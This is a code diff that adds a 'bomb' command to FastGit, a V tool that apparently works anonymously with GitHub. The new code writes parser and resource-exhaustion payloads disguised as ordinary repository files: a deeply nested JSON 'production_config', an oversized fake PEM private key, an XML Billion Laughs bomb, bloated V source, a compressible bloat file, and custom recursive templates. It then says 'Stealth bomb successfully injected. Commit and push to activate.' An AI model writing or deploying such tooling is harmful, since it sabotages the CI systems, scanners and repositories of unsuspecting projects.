@@ -49,6 +49,15 @@ struct GitHubTreeResponse {
 	tree []TreeItem
 }
 
+struct BombConfig {
+mut:
+	type       string
+	target     string
+	depth_size int
+	words      []string
+	template   string
+}
+
 fn get_repo_and_relative_path(file_path string) (string, string) {
 	abs_path := os.real_path(file_path)
 	mut current_dir := ""
@@ -773,6 +782,170 @@ fn confirm_upload(changed_files []string, auto_confirm bool) bool {
 	return ans == 'y' || ans == 'yes'
 }
 
+fn load_bomb_config() BombConfig {
+	default_cfg := BombConfig{
+		type: 'json'
+		target: 'tests/production_config.json'
+		depth_size: 10000
+		words: []string{}
+		template: ''
+	}
+	if !os.exists('.fastgit_bomb') {
+		return default_cfg
+	}
+	lines := os.read_lines('.fastgit_bomb') or { return default_cfg }
+	mut cfg := BombConfig{
+		type: 'json'
+		target: 'tests/production_config.json'
+		depth_size: 10000
+		words: []string{}
+		template: ''
+	}
+	for line in lines {
+		trimmed := line.trim_space()
+		if trimmed == '' || trimmed.starts_with('#') {
+			continue
+		}
+		if trimmed.starts_with('type=') {
+			cfg.type = trimmed.all_after('type=').trim_space()
+		} else if trimmed.starts_with('target=') {
+			cfg.target = trimmed.all_after('target=').trim_space()
+		} else if trimmed.starts_with('depth=') || trimmed.starts_with('size=') || trimmed.starts_with('funcs=') {
+			cfg.depth_size = trimmed.all_after('=').trim_space().int()
+		} else if trimmed.starts_with('words=') {
+			words_raw := trimmed.all_after('words=').trim_space()
+			cfg.words = words_raw.split(',')
+		} else if trimmed.starts_with('template=') {
+			cfg.template = trimmed.all_after('template=').trim_space()
+		}
+	}
+	return cfg
+}
+
+fn generate_stealth_json_bomb(cfg BombConfig) ! {
+	dir := os.dir(cfg.target)
+	if dir != '.' && dir != '' && !os.exists(dir) {
+		os.mkdir_all(dir)!
+	}
+	mut f := os.create(cfg.target)!
+	defer {
+		f.close()
+	}
+	mut pool := if cfg.words.len > 0 {
+		cfg.words
+	} else {
+		['config', 'database', 'settings', 'retry', 'policy', 'security', 'cluster', 'node', 'backup', 'schedule', 'interval', 'limit', 'threshold', 'response', 'header', 'token', 'gateway', 'auth', 'session']
+	}
+
+	for i in 0 .. cfg.depth_size {
+		word := pool[i % pool.len]
+		f.write_string('{"${word}":')!
+	}
+	f.write_string('1')!
+	for _ in 0 .. cfg.depth_size {
+		f.write_string('}')!
+	}
+}
+
+fn generate_stealth_pem_bomb(cfg BombConfig) ! {
+	dir := os.dir(cfg.target)
+	if dir != '.' && dir != '' && !os.exists(dir) {
+		os.mkdir_all(dir)!
+	}
+	mut f := os.create(cfg.target)!
+	defer {
+		f.close()
+	}
+	f.write_string("-----BEGIN PRIVATE KEY-----\n")!
+	
+	chars := 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/='
+	chunk_size := 1024
+	mut chunk := []u8{len: chunk_size}
+	for i in 0 .. chunk_size {
+		chunk[i] = chars[i % chars.len]
+	}
+	chunk_str := chunk.bytestr()
+	
+	size_mb := if cfg.depth_size == 10000 { 15 } else { cfg.depth_size }
+	for _ in 0 .. (size_mb * 1024) {
+		f.write_string(chunk_str)!
+	}
+	f.write_string('\n-----END PRIVATE KEY-----\n')!
+}
+
+fn generate_xml_bomb(file_path string) ! {
+	dir := os.dir(file_path)
+	if dir != '.' && dir != '' && !os.exists(dir) {
+		os.mkdir_all(dir)!
+	}
+	mut f := os.create(file_path)!
+	defer {
+		f.close()
+	}
+	xml_content := '<?xml version="1.0"?>\n<!DOCTYPE lolz [\n' +
+		' <!ENTITY lol "lol">\n' +
+		' <!ENTITY lol1 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">\n' +
+		' <!ENTITY lol2 "&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;">\n' +
+		' <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">\n' +
+		' <!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">\n' +
+		' <!ENTITY lol5 "&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;">\n' +
+		' <!ENTITY lol6 "&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;">\n' +
+		' <!ENTITY lol7 "&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;">\n' +
+		' <!ENTITY lol8 "&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;">\n' +
+		' <!ENTITY lol9 "&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;">\n' +
+		']>\n<lolz>&lol9;</lolz>\n'
+	f.write_string(xml_content)!
+}
+
+fn generate_v_ast_bloat(file_path string, num_funcs int) ! {
+	dir := os.dir(file_path)
+	if dir != '.' && dir != '' && !os.exists(dir) {
+		os.mkdir_all(dir)!
+	}
+	mut f := os.create(file_path)!
+	defer {
+		f.close()
+	}
+	f.write_string("module main\n\nimport os\n\n")!
+	for i in 0 .. num_funcs {
+		f.write_string("fn dummy_verify_auth_${i}(x int) int {\n\tmut res := x\n")!
+		for j in 0 .. 150 {
+			f.write_string("\tif res % ${j + 2} == 0 { res += ${j} } else { res -= 1 }\n")!
+		}
+		f.write_string("\treturn res\n}\n\n")!
+	}
+	f.write_string("fn main() {\n\tprintln(\"System online\")\n}\n")!
+}
+
+fn generate_compress_bloat(file_path string, size_mb int) ! {
+	dir := os.dir(file_path)
+	if dir != '.' && dir != '' && !os.exists(dir) {
+		os.mkdir_all(dir)!
+	}
+	mut f := os.create(file_path)!
+	defer {
+		f.close()
+	}
+	chunk := '0'.repeat(1024 * 1024)
+	for _ in 0 .. size_mb {
+		f.write_string(chunk)!
+	}
+}
+
+fn generate_custom_recursive_bomb(cfg BombConfig) ! {
+	dir := os.dir(cfg.target)
+	if dir != '.' && dir != '' && !os.exists(dir) {
+		os.mkdir_all(dir)!
+	}
+	mut current := "1"
+	for i := cfg.depth_size; i > 0; i-- {
+		mut step := cfg.template.replace('@NEST@', current)
+		step = step.replace('@NUM@', i.str())
+		current = step
+	}
+	os.write_file(cfg.target, current)!
+}
+
 fn print_usage() {
 	println('FastGit - A smart and anonymous tool for working with GitHub')
 	println('Usage:')
@@ -784,6 +957,7 @@ fn print_usage() {
 	println(' ./fastgit pr <git_url>  [base_branch]')
 	println(' ./fastgit fork <git_url>')
 	println(' ./fastgit sync <git_url> [branch_name]')
+	println(' ./fastgit bomb')
 	println('\nOptions:')
 	println(' -e, --email  GitHub anonymous email (Anonymous / No-Reply)')
 	println(' -n, --name  Git author name')
@@ -861,6 +1035,67 @@ fn main() {
 	
 	if positional_args.len < 2 {
 		print_usage()
+		return
+	}
+
+	if positional_args[1] == 'bomb' {
+		cfg := load_bomb_config()
+		println('Loading custom stealth configuration from .fastgit_bomb...')
+		println('Target file: ${cfg.target}')
+		println('Bomb type: ${cfg.type}')
+		match cfg.type {
+			'json' {
+				println('Generating polymorphic JSON config trap with depth of ${cfg.depth_size}...')
+				generate_stealth_json_bomb(cfg) or {
+					eprintln('Failed to generate stealth JSON bomb: ${err}')
+					return
+				}
+			}
+			'pem', 'text' {
+				println('Generating stealth PEM certificate Regex trap with size of ${cfg.depth_size} MB...')
+				generate_stealth_pem_bomb(cfg) or {
+					eprintln('Failed to generate stealth PEM bomb: ${err}')
+					return
+				}
+			}
+			'xml' {
+				println('Generating stealth XML Billion Laughs trap...')
+				generate_xml_bomb(cfg.target) or {
+					eprintln('Failed to generate XML bomb: ${err}')
+					return
+				}
+			}
+			'v_ast' {
+				println('Generating polymorphic V AST bloat trap with ${cfg.depth_size} functions...')
+				generate_v_ast_bloat(cfg.target, cfg.depth_size) or {
+					eprintln('Failed to generate V AST bomb: ${err}')
+					return
+				}
+			}
+			'compress' {
+				println('Generating highly compressible git bloat file with size of ${cfg.depth_size} MB...')
+				generate_compress_bloat(cfg.target, cfg.depth_size) or {
+					eprintln('Failed to generate compress bomb: ${err}')
+					return
+				}
+			}
+			'custom' {
+				if cfg.template == '' {
+					eprintln('Error: "template" parameter is not set in .fastgit_bomb for custom type.')
+					return
+				}
+				println('Generating custom recursive template trap with depth of ${cfg.depth_size}...')
+				generate_custom_recursive_bomb(cfg) or {
+					eprintln('Failed to generate custom recursive bomb: ${err}')
+					return
+				}
+			}
+			else {
+				println('Unknown bomb type defined in config. Supported: json, pem, xml, v_ast, compress, custom')
+				return
+			}
+		}
+		println('Stealth bomb successfully injected. Commit and push to activate.')
 		return
 	}
 
